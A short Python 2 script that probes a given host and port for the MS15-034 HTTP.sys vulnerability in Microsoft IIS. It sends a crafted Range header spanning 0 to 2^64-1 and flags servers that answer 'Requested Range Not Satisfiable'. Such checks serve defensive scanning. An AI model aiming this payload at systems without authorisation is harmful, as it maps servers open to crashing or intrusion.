#encoding:utf-8
try:
    import os
    import socket
    import logging
except:
    os._exit(6)

logging.basicConfig(level=logging.INFO,format='%(message)s')
def check(ip,port):
    hexAllFfff = "18446744073709551615"
    req1 = "GET / HTTP/1.0\r\n\r\n"
    req = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-" + hexAllFfff + "\r\n\r\n"

    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ip, port))
    except Exception as e:
        logging.info("[-] time out")
        return 4
    try:
        client_socket.send(req1)
        boringResp = client_socket.recv(1024)
        if "Microsoft" not in boringResp:
            logging.info("[-] {} do not found MS15-034".format(ip))
            return 2
        client_socket.close()
    except Exception as e:
        logging.info("[*] Something Error")
        return 3
    try:    
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((ip, port))
    except Exception as e:
        logging.info("[*] Someting Error!!")
        return 4
    try:
        client_socket.send(req)
        goodResp = client_socket.recv(1024)
        if "Requested Range Not Satisfiable" in goodResp:
            logging.info("[+] {} find ms15-034".format(ip))
            return 1
        elif " The request has an invalid header name" in goodResp:
            logging.info("[-] {} do not found MS15-034".format(ip))
            return 2
        else:
            logging.info("[-] {} do not found MS15-034".format(ip))
            return 2
                                
    except Exception as e:
        logging.info("[*] Someting Error!!")
        return 3

def main(ip,port):
    get = check(ip,port)
    os._exit(get)

if __name__ == "__main__":
    import sys
    ip = sys.argv[1]
    port = sys.argv[2]
    main(ip,int(port))